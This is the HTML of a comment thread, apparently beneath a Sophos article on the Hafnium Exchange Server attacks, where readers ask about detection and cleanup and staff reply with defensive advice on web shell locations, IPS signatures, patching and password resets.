		<article class="comment byuser comment-author-sallyadam odd alt depth-2  bystaff" id="comment-241114" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-09T09:27-05:00" itemprop="datePublished"><a href="#comment-241114" itemprop="url">09 March 2021 at 9:27 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>As Server Lockdown does not monitor aspx it would not have prevented the installation of the webshell.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241114#respond' data-commentid="241114" data-postid="73211" data-belowelement="comment-241114" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-odd thread-alt depth-1 parent " id="comment-241284" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													ChrisP											</h2>
					<time class="comment-meta-item" datetime="2021-03-09T14:08-05:00" itemprop="datePublished"><a href="#comment-241284" itemprop="url">09 March 2021 at 2:08 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>How does Microsoft Safety Scanner differ from a provided power shell script and does Sophos recommend using that scanner? </p>
<p>https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241284#respond' data-commentid="241284" data-postid="73211" data-belowelement="comment-241284" data-respondelement="respond" data-replyto="Reply to ChrisP" aria-label='Reply to ChrisP'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam odd alt depth-2  bystaff" id="comment-241652" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-11T11:54-05:00" itemprop="datePublished"><a href="#comment-241652" itemprop="url">11 March 2021 at 11:54 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The MSERT tool is somewhat repetitive if you have Sophos installed. It will just identify in most case existing shells which are on the system. The ProxyLogon.ps1 script is identifying a few more pieces of information such as attempts at using the vulnerability based on reviewing IIS and Exchange logs.<br />
This is still a good resource from the MS Exchange team: https://github.com/microsoft/CSS-Exchange/tree/main/Security<br />
(Thanks to Mat Gangwer for this update)</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241652#respond' data-commentid="241652" data-postid="73211" data-belowelement="comment-241652" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-even depth-1 parent " id="comment-241318" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://www.mtco.com" itemprop="author">Nick Fawcett</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-09T20:34-05:00" itemprop="datePublished"><a href="#comment-241318" itemprop="url">09 March 2021 at 8:34 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Is Sophos UTM 9 actively protecting Exchange if you have it setup on Web Protection WAF?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241318#respond' data-commentid="241318" data-postid="73211" data-belowelement="comment-241318" data-respondelement="respond" data-replyto="Reply to Nick Fawcett" aria-label='Reply to Nick Fawcett'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam odd alt depth-2  bystaff" id="comment-241641" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-11T09:25-05:00" itemprop="datePublished"><a href="#comment-241641" itemprop="url">11 March 2021 at 9:25 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>WAF on its own is not sufficient protection &#8211; for best protection we advise enabling IPS and ATP. The IPS signatures for Sophos UTM are included in this article.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241641#respond' data-commentid="241641" data-postid="73211" data-belowelement="comment-241641" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-odd thread-alt depth-1 parent " id="comment-241570" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													DFIR_Guy											</h2>
					<time class="comment-meta-item" datetime="2021-03-10T14:35-05:00" itemprop="datePublished"><a href="#comment-241570" itemprop="url">10 March 2021 at 2:35 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thank you for the helpful information. Are you able to provide  the full path to the OAB configuration file containing china chopper in the screenshot above?  It is also mentioned here &#8211; &#8220;When reviewing the potential web shells identified by the queries, the web shell will typically appear inside an Exchange Offline Address Book (OAB) configuration file, in the ExternalUrl field. E.g&#8221;</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241570#respond' data-commentid="241570" data-postid="73211" data-belowelement="comment-241570" data-respondelement="respond" data-replyto="Reply to DFIR_Guy" aria-label='Reply to DFIR_Guy'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam odd alt depth-2  bystaff" id="comment-241651" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-11T11:52-05:00" itemprop="datePublished"><a href="#comment-241651" itemprop="url">11 March 2021 at 11:52 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>THE OAB / shells are generally being placed in the following directories:<br />
•	C:\inetpub\wwwroot\aspnet_client\<br />
•	C:\inetpub\wwwroot\aspnet_client\system_web\</p>
<p>In Microsoft Exchange Server installation paths such as:<br />
•	%PROGRAMFILES%\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\<br />
•	C:\Exchange\FrontEnd\HttpProxy\owa\auth\</p>
<p>(Thanks to Mat Gangwer for this update)</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241651#respond' data-commentid="241651" data-postid="73211" data-belowelement="comment-241651" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-even depth-1 parent " id="comment-241640" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://www.unity.co.zm" itemprop="author">Mbiko Ngoma</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-11T09:07-05:00" itemprop="datePublished"><a href="#comment-241640" itemprop="url">11 March 2021 at 9:07 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>I do not think that &#8221; OutlookEN.aspx &#8221; is a malicious file cause equally i experienced the same attack but this file was not created during the attack it had been modified sometime during exchange installation in my case it was 1st March 2019<br />
I had also noticed OutlookCN.aspx which I also feel is not malicios.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241640#respond' data-commentid="241640" data-postid="73211" data-belowelement="comment-241640" data-respondelement="respond" data-replyto="Reply to Mbiko Ngoma" aria-label='Reply to Mbiko Ngoma'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-andrewbrandt odd alt depth-2  bystaff" id="comment-242385" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/216532880604c8cf0600f4bc964cf01d?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/216532880604c8cf0600f4bc964cf01d?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Andrew Brandt											</h2>
					<time class="comment-meta-item" datetime="2021-03-16T18:28-04:00" itemprop="datePublished"><a href="#comment-242385" itemprop="url">16 March 2021 at 6:28 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Hi there. If you suspect that a file detection is a false positive (meaning, we are detecting something benign as if it was malicious), please either visit this page on the website to submit the sample file for analysis (https://support.sophos.com/support/s/filesubmission?language=en_US) or send the file via email to samples (@) sophos.com with a subject line that contains the words &#8220;false positive&#8221; &#8211; thanks! -=A</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242385#respond' data-commentid="242385" data-postid="73211" data-belowelement="comment-242385" data-respondelement="respond" data-replyto="Reply to Andrew Brandt" aria-label='Reply to Andrew Brandt'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even thread-odd thread-alt depth-1 parent " id="comment-241722" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Joey											</h2>
					<time class="comment-meta-item" datetime="2021-03-12T01:36-05:00" itemprop="datePublished"><a href="#comment-241722" itemprop="url">12 March 2021 at 1:36 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Hello, </p>
<p>We are using the Exchange 2019 CU7, Initially after installing the KB5000871. we had run the Test-ProxyLogon.ps1 to check if the system was compromised. The results shows the system was compromise. Suspicious activity found in HTTP Proxy and ECP logs. Also, i can see the supp0rt.aspx under the C:\inetpub\wwwroot\aspnet_client folder. When i am trying copy the &#8220;supp0rt.aspx&#8221; it did vanished automatically.</p>
<p>What other things that we can do to make sure that the system are healthy and the infiltrator does not leave behind any code that he can connect and control the system later on.</p>
<p>Joey</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241722#respond' data-commentid="241722" data-postid="73211" data-belowelement="comment-241722" data-respondelement="respond" data-replyto="Reply to Joey" aria-label='Reply to Joey'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam odd alt depth-2 parent bystaff" id="comment-241746" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-12T05:43-05:00" itemprop="datePublished"><a href="#comment-241746" itemprop="url">12 March 2021 at 5:43 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>If your system was compromised you need to remove the webshells and change your passwords. You also need to apply the Microsoft patches. If you are unable to remove the webshells yourself the Sophos MTR team can ensure that all adversarial activity in your environment is identified and neutralized.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241746#respond' data-commentid="241746" data-postid="73211" data-belowelement="comment-241746" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment even depth-3 parent " id="comment-242292" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Donald Lin											</h2>
					<time class="comment-meta-item" datetime="2021-03-16T01:45-04:00" itemprop="datePublished"><a href="#comment-242292" itemprop="url">16 March 2021 at 1:45 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>&#8220;change your passwords&#8221;, change administrator password or all user&#8217;s ?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242292#respond' data-commentid="242292" data-postid="73211" data-belowelement="comment-242292" data-respondelement="respond" data-replyto="Reply to Donald Lin" aria-label='Reply to Donald Lin'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam odd alt depth-4  bystaff" id="comment-242346" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-16T10:04-04:00" itemprop="datePublished"><a href="#comment-242346" itemprop="url">16 March 2021 at 10:04 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>This will depend on what post-exploitation activity is observed. While reviewing processes that are spawned and commands executed by the adversary, note what accounts they have been utlitizing and password resets for these accounts should be prioritized. If you&#8217;re unable to ascertain what post-exploit activity took place, domain-wide password resets are often a comprehensive course of action.<br />
(Thanks to Greg Iddon for this guidance)</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242346#respond' data-commentid="242346" data-postid="73211" data-belowelement="comment-242346" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article></section></article>
		<article class="comment even depth-2  " id="comment-242340" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/965c5644f910cb9aca1db7e71491ede6?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/965c5644f910cb9aca1db7e71491ede6?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													J.J. Thompson											</h2>
					<time class="comment-meta-item" datetime="2021-03-16T09:13-04:00" itemprop="datePublished"><a href="#comment-242340" itemprop="url">16 March 2021 at 9:13 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Additionally, you need to take a look at all activity within your exposure window. This the time between the web shell being placed and your patching time. Within that window, conduct a review of any and all activity seeking anomalous behavior, file access, lateral movement, privilege escalation, exfiltration, planting of additional code, configuration modifications, etc.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242340#respond' data-commentid="242340" data-postid="73211" data-belowelement="comment-242340" data-respondelement="respond" data-replyto="Reply to J.J. Thompson" aria-label='Reply to J.J. Thompson'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-even depth-1 parent " id="comment-241728" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Anonymous											</h2>
					<time class="comment-meta-item" datetime="2021-03-12T02:15-05:00" itemprop="datePublished"><a href="#comment-241728" itemprop="url">12 March 2021 at 2:15 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Why is the IPS signature ID 2305107 default action set to allow for CVE-2021-26855?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=241728#respond' data-commentid="241728" data-postid="73211" data-belowelement="comment-241728" data-respondelement="respond" data-replyto="Reply to Anonymous" aria-label='Reply to Anonymous'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam even depth-2  bystaff" id="comment-242492" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-17T04:54-04:00" itemprop="datePublished"><a href="#comment-242492" itemprop="url">17 March 2021 at 4:54 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The IPS signature ID 2305107 are equivalent to the 57xxx signatures. They were initially released to SFOS specifically for the EP IPS and XG platforms with the action set to allow and gauge safety and effectiveness. It was decided to update the default action to drop and that update was published in the SFOS release on March 15th.<br />
(Thanks to SophosLabs Threat Research team for this info)</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242492#respond' data-commentid="242492" data-postid="73211" data-belowelement="comment-242492" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-odd thread-alt depth-1 parent " id="comment-242329" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Tom											</h2>
					<time class="comment-meta-item" datetime="2021-03-16T08:28-04:00" itemprop="datePublished"><a href="#comment-242329" itemprop="url">16 March 2021 at 8:28 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Is there a scenario where Sophos stops this new attack entirely? Did the machine learning with Intercept X for server identify this attack or did this particular type of Zero day slip past due to its new behaviour?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242329#respond' data-commentid="242329" data-postid="73211" data-belowelement="comment-242329" data-respondelement="respond" data-replyto="Reply to Tom" aria-label='Reply to Tom'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-andrewbrandt even depth-2 parent bystaff" id="comment-242386" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/216532880604c8cf0600f4bc964cf01d?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/216532880604c8cf0600f4bc964cf01d?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Andrew Brandt											</h2>
					<time class="comment-meta-item" datetime="2021-03-16T18:31-04:00" itemprop="datePublished"><a href="#comment-242386" itemprop="url">16 March 2021 at 6:31 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>With the most current version of Intercept X installed on the Exchange server, it should detect the presence of both a web shell and a malicious program. The main problem seems to be that not all Exchange servers are running an endpoint protection tool.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242386#respond' data-commentid="242386" data-postid="73211" data-belowelement="comment-242386" data-respondelement="respond" data-replyto="Reply to Andrew Brandt" aria-label='Reply to Andrew Brandt'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment odd alt depth-3  " id="comment-242482" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/a7e3e97f8571c1a623d62273099dded5?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/a7e3e97f8571c1a623d62273099dded5?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Steffen hornung											</h2>
					<time class="comment-meta-item" datetime="2021-03-17T04:01-04:00" itemprop="datePublished"><a href="#comment-242482" itemprop="url">17 March 2021 at 4:01 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>To me I would not want an endpoint protection tool on a server as most are not server-aware and especially on exchange they tend to mess with exchange logs which wreaks havoc in case of a database problem.<br />
So you should double-check the appropriateness of such a tool on servers in order to protect and not do harm.<br />
Short story: check requirements, manual and best practice (as always ;-) )</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242482#respond' data-commentid="242482" data-postid="73211" data-belowelement="comment-242482" data-respondelement="respond" data-replyto="Reply to Steffen hornung" aria-label='Reply to Steffen hornung'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment even depth-2  " id="comment-242769" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/965c5644f910cb9aca1db7e71491ede6?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/965c5644f910cb9aca1db7e71491ede6?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													J.J. Thompson											</h2>
					<time class="comment-meta-item" datetime="2021-03-18T11:00-04:00" itemprop="datePublished"><a href="#comment-242769" itemprop="url">18 March 2021 at 11:00 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Hi Tom, here&#8217;s another way to think of this.<br />
Hafnium is unlike other exploits. It abused a valid set of instructions in Microsoft Exchange OWA, making it difficult to detect proactively. It is detectable &#8220;post-event&#8221; when it pivots to regular threat behavior techniques and IoCs. For a metaphor, it is the social engineering equivalent in the software world. </p>
<p>Proactive protection monitors for unauthorized access to memory and other techniques. Hafnium behaves by the rules and logic set out in MS Exchange OWA. Unfortunately the logic in the rules was broken. Defense in depth is essential in cases like this so you can quickly detect the second stage of the attack.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242769#respond' data-commentid="242769" data-postid="73211" data-belowelement="comment-242769" data-respondelement="respond" data-replyto="Reply to J.J. Thompson" aria-label='Reply to J.J. Thompson'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-even depth-1 parent " id="comment-242976" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Bjoern Ebner											</h2>
					<time class="comment-meta-item" datetime="2021-03-19T10:09-04:00" itemprop="datePublished"><a href="#comment-242976" itemprop="url">19 March 2021 at 10:09 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>I used above script to establish the impact in EDR.<br />
It found some processes that might have used the webshell.<br />
I can see that csc was called with a paramter with a file that ends with cmdline.</p>
<p>After that some kind of tmp-file was created in a temp folder. That can be seen from the process tree.</p>
<p>How would you suggest to further investigate that?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=242976#respond' data-commentid="242976" data-postid="73211" data-belowelement="comment-242976" data-respondelement="respond" data-replyto="Reply to Bjoern Ebner" aria-label='Reply to Bjoern Ebner'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-alicebarford even depth-2  bystaff" id="comment-274773" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
